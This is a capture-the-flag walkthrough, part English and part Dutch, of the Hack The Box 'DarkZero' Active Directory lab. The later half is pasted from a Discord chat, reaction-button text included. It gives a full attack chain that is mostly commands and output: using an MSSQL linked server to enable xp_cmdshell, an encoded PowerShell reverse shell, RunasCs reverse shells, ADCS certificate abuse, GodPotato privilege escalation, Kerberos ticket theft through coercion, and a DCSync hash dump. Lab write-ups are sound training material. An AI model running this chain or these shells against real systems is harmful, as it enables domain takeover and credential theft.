# Machine information
As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Darkzero]
└─$ nmap 10.129.98.254
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:01 CEST
Nmap scan report for 10.129.98.254
Host is up (0.024s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
nmap -sCV 10.129.98.254 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 01:02:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-08T01:04:08+00:00; +6h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.98.254:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-08T01:02:11
|_Not valid after:  2055-10-08T01:02:11
| ms-sql-info: 
|   10.129.98.254:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-08T01:03:28
|_  start_date: N/A
```

Aangezien dat we nu toch al de username en password van een user kennen zal ik de gegevens van de ldap server gaan halen zodat ik deze daarna kan gaan uploaden in bloodhound. 

```
┌──(kali㉿kali)-[~/HTB/Darkzero]
└─$ sudo nxc ldap 10.129.98.254 -u 'john.w' -p 'RFulUtONCOL!' --bloodhound --collection all --dns-server 10.129.98.254       
LDAP        10.129.98.254   389    DC01             [*] 10.0 Build 26100 (name:DC01) (domain:darkzero.htb)
LDAPS       10.129.98.254   636    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
LDAPS       10.129.98.254   636    DC01             Resolved collection methods: psremote, acl, localadmin, rdp, dcom, container, objectprops, trusts, session, group                                                                   
[03:46:18] ERROR    Unhandled exception in computer DC01.darkzero.htb processing: The NETBIOS       computers.py:268
                    connection with the remote host timed out.                                                      
LDAP        10.129.98.254   389    DC01             Done in 00M 27S
LDAPS       10.129.98.254   636    DC01             Compressing output into /root/.nxc/logs/DC01_10.129.98.254_2025-10-08_034551_bloodhound.zip
```

Zoals je ook hebt kunnen zien is de port van sql open. We gaan de connectie met de sql server proberen maken door gebruik te maken van mssqlclient commando.

```
ssqlclient.py -windows-auth darkzero.htb/john.w:'RFulUtONCOL!'@10.129.98.254
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

Zoals je hierboven zult kunnen zien heb je nu de connectie. Ik zal gaan kijken welke tables er gekent zijn.

```
SQL (darkzero\john.w  guest@master)> SELECT name from master.dbo.sysdatabases
name     
------   
master   

tempdb   

model    

msdb
```

Zoals je hieronder zult kunnen zien hebben we een link met de DC02 van de server.

```
SQL (darkzero\john.w  guest@master)> enum_links
[%] EXEC sp_linkedservers
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

[%] EXEC sp_helplinkedsrvlogin
Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
```

Nu dat we dit weten zal ik de link gaan gebruiken voor connectie tussen de 2 te maken. Dit kan je gaan doen door het use_link commando te gaan gebruiken. Als er een linkname met punten in de naam is moet je de [] haakjes gebruiken voor de naam te laten herkenen.

```
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
[%] EXEC ('select system_user as "username"') AT [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)>
```

Daarna ben ik het xp_cmdshell gaan enable zodat ik mijn connectie tussen de server en de machine tot stand kon brengen. Door een listener op te zetten heb ik de connectie kunnen verkrijgen.

```
mssqlclient

SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
[%] EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> RECONFIGURE;
[%] EXEC ('RECONFIGURE;') AT [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
[%] EXEC ('exec master..xp_cmdshell ''powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==''') AT [DC02.darkzero.ext]

Kali machine

┌──(kali㉿kali)-[~/HTB/Darkzero]
└─$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.12.43 53746

PS C:\Windows\system32>
```

Als je een paar directories lowered kan je zien dat er een `Policy_Backup.inf` file is.

```
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          5/8/2021   8:15 AM                PerfLogs                                                             
d-r---         7/29/2025   2:49 PM                Program Files                                                        
d-----         7/29/2025   2:48 PM                Program Files (x86)                                                  
d-r---         7/29/2025   3:23 PM                Users                                                                
d-----         7/30/2025  10:57 PM                Windows                                                              
-a----         7/30/2025   1:38 PM          18594 Policy_Backup.inf 
```

Als we deze nu eens gaan bekijken door het `type` commando te gaan gebruiken zal je het volgende zien.

```
SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"

```



C:\> type Policy_Backup.inf
...[snip]...

SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
:joy:
Click to react
:white_check_mark:
Click to react
:key:
Click to react
Add Reaction
Reply
Forward
More
[4:57 PM]Tuesday, October 7, 2025 4:57 PM
CERTIPY-... 172.16.20.2     389    DC02             Certificate Authorities
CERTIPY-... 172.16.20.2     389    DC02               0
CERTIPY-... 172.16.20.2     389    DC02                 CA Name                             : darkzero-ext-DC02-CA
CERTIPY-... 172.16.20.2     389    DC02                 DNS Name                            : DC02.darkzero.ext
CERTIPY-... 172.16.20.2     389    DC02                 Certificate Subject                 : CN=darkzero-ext-DC02-CA, DC=darkzero, DC=ext
CERTIPY-... 172.16.20.2     389    DC02                 Certificate Serial Number           : 1643389103EC9DA6407DCE3E015ECD07
CERTIPY-... 172.16.20.2     389    DC02                 Certificate Validity Start          : 2025-07-29 14:17:46+00:00
CERTIPY-... 172.16.20.2     389    DC02                 Certificate Validity End            : 2035-07-29 14:27:43+00:00
[4:57 PM]Tuesday, October 7, 2025 4:57 PM
ADCS,
Note: Don't forget to pivot..

To authenticate cert & change password, you need to pivot

# Request Cert
PS > .\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User

# Export to pfx
➜ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate Cert
➜ certipy auth -pfx cert.pfx -u svc_sql -domain darkzero.ext -dc-ip 172.16.20.2

# ChangePassword
➜ changepasswd.py svc_sql@darkzero.ext -hashes :816ccb849956b531db139346751db65f \
        -newpass 'StrongPassword123' -dc-ip 172.16.20.2
 (edited)Tuesday, October 7, 2025 5:13 PM
:joy:
Click to react
:white_check_mark:
Click to react
:key:
Click to react
Add Reaction
Reply
Forward
More
[4:57 PM]Tuesday, October 7, 2025 4:57 PM
Shell as 'sql_svc' | Elevated Shell,
PS C:\programdata> .\RunasCs.exe svc_sql 'StrongPassword123' powershell -l 5 -b -r 10.10.X.X:9009

➜ sudo rlwrap -cAr ncat -lnvp 9009
...[snip]...

PS C:\Windows\system32> whoami; hostname
darkzero-ext\svc_sql
DC02

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
[4:57 PM]Tuesday, October 7, 2025 4:57 PM
SeImpersonate,
Shell as Administrator | DC02,
PS C:\programdata> .\GodPotato.exe -cmd 'net user administrator StrongPassword456'
PS C:\programdata> .\RunasCs.exe administrator 'StrongPassword456' powershell -r 10.10.X.X:9008

➜ sudo rlwrap -cAr ncat -lnvp 9008
...[snip]...

PS C:\Windows\system32> whoami; hostname
darkzero-ext\administrator
DC02
:joy:
Click to react
:white_check_mark:
Click to react
:key:
Click to react
Add Reaction
Reply
Forward
More
[4:58 PM]Tuesday, October 7, 2025 4:58 PM
Root,
Shell as Administrator | DC01,
# Rubeus Monitor
PS > .\Rubeus.exe monitor /interval:5 /nowrap

# Coerce via MSSQL instance
SQL > xp_dirtree \\DC02.darkzero.ext\pwn

# Get DC01$ Ticket.. | Decode & Convert it
➜ cat dc01.kirbi.b64 | base64 -d > dc01.kirbi
➜ ticketConverter.py dc01.kirbi dc01.ccache

# Verify Ticket
➜ klist dc01.ccache

# DCSync | Dump Hashes
➜ secretsdump.py darkzero.htb/'dc01$'@dc01.darkzero.htb \
    -k -no-pass -dc-ip $ip